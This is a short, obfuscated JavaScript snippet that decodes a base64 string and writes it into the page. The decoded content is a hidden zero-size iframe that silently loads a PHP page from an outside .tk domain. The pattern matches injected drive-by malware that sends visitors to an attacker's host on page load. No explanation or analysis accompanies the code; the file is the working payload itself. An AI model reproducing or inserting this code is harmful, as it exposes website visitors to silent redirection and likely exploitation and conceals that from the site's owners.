var k0e0y0S = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
var xojY = "PGlmcmFtZSBzcmM9Imh0dHA6Ly9naHBwcG9vcmkudGsvbWFpbi5waHAiIHdpZHRoPSIwIiBoZWlnaHQ9IjAiIGZyYW1lYm9yZGVyPSIwIj48L2lmcmFtZT4=";
var atvG = "";
var kGYi, NCOI, BICb, qHKv, sZXk, KOcZ, ML90 = "";
var i = 0;
var base64test = /[^A-Za-z0-9\+\/\=]/g;
xojY = xojY.replace(/[^A-Za-z0-9\+\/\=]/g, "");
do {
    qHKv = k0e0y0S.indexOf(xojY.charAt(i++));
    sZXk = k0e0y0S.indexOf(xojY.charAt(i++));
    KOcZ = k0e0y0S.indexOf(xojY.charAt(i++));
    ML90 = k0e0y0S.indexOf(xojY.charAt(i++));
    kGYi = (qHKv << 2) | (sZXk >> 4);
    NCOI = ((sZXk & 15) << 4) | (KOcZ >> 2);
    BICb = ((KOcZ & 3) << 6) | ML90;
    atvG = atvG + String.fromCharCode(kGYi);
    if (KOcZ != 64) {
        atvG = atvG + String.fromCharCode(NCOI)
    }
    if (ML90 != 64) {
        atvG = atvG + String.fromCharCode(BICb)
    }
    kGYi = NCOI = BICb = "";
    qHKv = sZXk = KOcZ = ML90 = ""
} while (i < xojY.length);
document.write(unescape(atvG));